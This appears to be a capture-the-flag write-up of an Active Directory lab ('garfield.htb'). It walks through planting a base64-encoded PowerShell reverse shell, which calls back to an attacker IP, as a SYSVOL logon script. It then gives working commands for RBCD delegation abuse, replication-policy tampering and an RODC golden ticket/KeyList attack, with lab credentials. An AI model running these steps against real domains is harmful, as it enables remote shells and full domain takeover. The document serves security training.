Initial Access — Logon Script Abuse

Three misconfigs chain here: SYSVOL write via SMB, WRITE on l.wilson's scriptPath, and Windows auto-executing logon scripts on authentication. Craft a PowerShell reverse shell, base64 encode it, drop it as a bat in SYSVOL, set the scriptPath — shell arrives when the domain simulates a logon.

Step 1 — Generate Reverse Shell Payload

$ echo '$client = New-Object System.Net.Sockets.TCPClient("10.10.xx.xx",9001);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
  $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback=(iex $data 2>&1|Out-String);
  $sendback2=$sendback+"PS "+(pwd).Path+"> ";
  $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
$client.Close()' | iconv -t UTF-16LE | base64 -w0

Step 2 — Create and Upload the Bat

$ cat > /tmp/printerDetect.bat << EOF
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64_OUTPUT>
EOF

$ smbclient //10.129.xx.xx/SYSVOL -U j.arbuckle%'Th1sD4mnC4t!@1978'

smb: \garfield.htb\scripts\> put /tmp/printerDetect.bat printerDetect.bat

RBCD Attack — SYSTEM on RODC01

l.wilson_adm has WRITE over CN=RODC01. RBCD lets us set msDS-AllowedToActOnBehalfOfOtherIdentity on the computer object, then impersonate any domain user to it. Create a fake machine account, configure delegation, get a service ticket as Administrator.

Add l.wilson_adm to RODC Administrators

$ bloodyAD --host garfield.htb -u l.wilson_adm -p 'WhoKnows123!' \
  add groupMember "RODC Administrators" l.wilson_adm
[+] l.wilson_adm added to RODC Administrators

Create Fake Machine Account

$ impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
  -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip 10.129.xx.xx
[*] Successfully added machine account FAKE$ with password FakePass123!

Set RBCD on RODC01 (from evil-winrm)

*Evil-WinRM* PS> Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$

Get Service Ticket + psexec

$ impacket-getST garfield.htb/'FAKE$':'FakePass123!' \
  -spn cifs/RODC01.garfield.htb \
  -impersonate Administrator \
  -dc-ip 10.129.xx.xx

$ export KRB5CCNAME=$(pwd)/Administrator@[email protected]

$ impacket-psexec -k -no-pass \
  -dc-ip 10.129.xx.xx \
  -target-ip 192.168.100.2 \
  garfield.htb/[email protected]
C:\Windows\system32> whoami
nt authority\system
-target-ip 192.168.100.2 is required. Without it impacket resolves RODC01 via DNS and gets DC01's IP. This flag forces the connection to the actual internal address through Ligolo while keeping the hostname correct for Kerberos.

8
Modifying RODC Replication Policy

A RODC Golden Ticket can only be exchanged for a real service ticket for accounts that are in msDS-RevealOnDemandGroup and not blocked by msDS-NeverRevealGroup. Administrator isn't in the allowed group by default — add them and clear the deny list before the KeyList attack will work.

From evil-winrm as l.wilson_adm:

*Evil-WinRM* PS> upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
*Evil-WinRM* PS> Import-Module .\PowerView.ps1

*Evil-WinRM* PS> Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )}

*Evil-WinRM* PS> Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'

RODC Golden Ticket → KeyList Attack → Root

We use the krbtgt_8245 AES key to forge a TGT appearing to come from RODC01, then present it to DC01 via a KeyList request. DC01 validates the RODC-signed TGT, sees Administrator is now in the allowed replication group, and issues a real TGS — domain admin via ticket exchange.

Rubeus version is critical. v2.2.0 silently ignores /keyList and produces KRB_AP_ERR_BAD_INTEGRITY. You need v2.3.3+. Get it from SharpCollection.
$ wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe -O /tmp/Rubeus.exe
